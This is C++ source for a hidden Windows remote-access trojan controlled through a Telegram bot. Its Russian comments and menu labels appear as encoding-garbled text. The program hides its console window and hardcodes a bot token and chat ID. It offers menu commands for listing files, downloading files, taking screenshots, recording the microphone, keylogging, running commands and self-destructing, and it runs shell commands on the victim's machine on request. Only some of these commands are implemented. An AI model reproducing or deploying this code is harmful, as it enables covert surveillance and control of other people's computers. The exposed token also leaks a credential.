#include <iostream>
#include <windows.h>
#include <curl/curl.h>
#include <json-c/json.h>
#include <thread>
#include <fstream>
#include <sstream>

#define BOT_TOKEN "8254717589:AAF5I5BW5xaL-wHqQhm6n2HX9nfaOLkcgxU"
#define CHAT_ID "8367594494"

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫
bool is_running = true;
int retry_count = 0;

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π —Å –ø–æ–≤—Ç–æ—Ä–µ–Ω–∏–µ–º –ø—Ä–∏ –æ—à–∏–±–∫–µ
bool send_telegram_message(const std::string& text) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                     "/sendMessage?chat_id=" + std::string(CHAT_ID) + 
                     "&text=" + text;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        std::cerr << "–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è. –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞..." << std::endl;
        Sleep(2000);
        return send_telegram_message(text); // –†–µ–∫—É—Ä—Å–∏–≤–Ω—ã–π –ø–æ–≤—Ç–æ—Ä
    }
    return true;
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
bool send_keyboard() {
    CURL* curl = curl_easy_init();
    if (!curl) return false;

    const char* keyboard_json = R"({
        "keyboard": [
            [{"text": "üìÇ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤"}, {"text": "‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª"}],
            [{"text": "üñ• –°–∫—Ä–∏–Ω—à–æ—Ç"}, {"text": "üé§ –ó–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞"}],
            [{"text": "‚å®Ô∏è –ö–µ–π–ª–æ–≥–≥–µ—Ä"}, {"text": "üíª –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É"}],
            [{"text": "üíÄ –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ò–ï"}]
        ],
        "resize_keyboard": true,
        "one_time_keyboard": false
    })";

    std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                     "/sendMessage?chat_id=" + std::string(CHAT_ID) + 
                     "&text=–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:" + 
                     "&reply_markup=" + keyboard_json;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK);
}

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –Ω–∞–∂–∞—Ç–∏–π –∫–Ω–æ–ø–æ–∫
void handle_buttons() {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    while (is_running) {
        std::string url = "https://api.telegram.org/bot" + std::string(BOT_TOKEN) + 
                         "/getUpdates?offset=-1&timeout=10";
        std::string response;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char* ptr, size_t size, size_t nmemb, std::string* data) -> size_t {
            data->append(ptr, size * nmemb);
            return size * nmemb;
        });
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        CURLcode res = curl_easy_perform(curl);

        if (res == CURLE_OK) {
            json_object* json = json_tokener_parse(response.c_str());
            if (json) {
                json_object* updates = json_object_object_get(json, "result");
                if (json_object_get_type(updates) == json_type_array) {
                    int length = json_object_array_length(updates);
                    if (length > 0) {
                        json_object* update = json_object_array_get_idx(updates, length - 1);
                        json_object* message = json_object_object_get(update, "message");
                        json_object* text_obj = json_object_object_get(message, "text");
                        const char* text = json_object_get_string(text_obj);

                        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫
                        if (strcmp(text, "üìÇ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤") == 0) {
                            system("dir C:\\ > files.txt");
                            send_telegram_message("–°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.");
                        }
                        else if (strcmp(text, "üñ• –°–∫—Ä–∏–Ω—à–æ—Ç") == 0) {
                            system("nircmd.exe savescreenshot screenshot.png");
                            send_telegram_message("–°–∫—Ä–∏–Ω—à–æ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω.");
                        }
                        else if (strcmp(text, "üíÄ –°–ê–ú–û–£–ù–ò–ß–¢–û–ñ–ï–ù–ò–ï") == 0) {
                            send_telegram_message("–£–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ.");
                            is_running = false;
                            break;
                        }
                    }
                }
                json_object_put(json);
            }
        } else {
            std::cerr << "–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Telegram. –ü–æ–≤—Ç–æ—Ä —á–µ—Ä–µ–∑ 5 —Å–µ–∫..." << std::endl;
            Sleep(5000);
        }
    }
    curl_easy_cleanup(curl);
}

int main() {
    // –°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
    std::thread bot_thread(handle_buttons);

    // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
    while (!send_keyboard()) {
        std::cerr << "–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É. –ü–æ–≤—Ç–æ—Ä..." << std::endl;
        Sleep(3000);
    }

    bot_thread.join();
    return 0;
}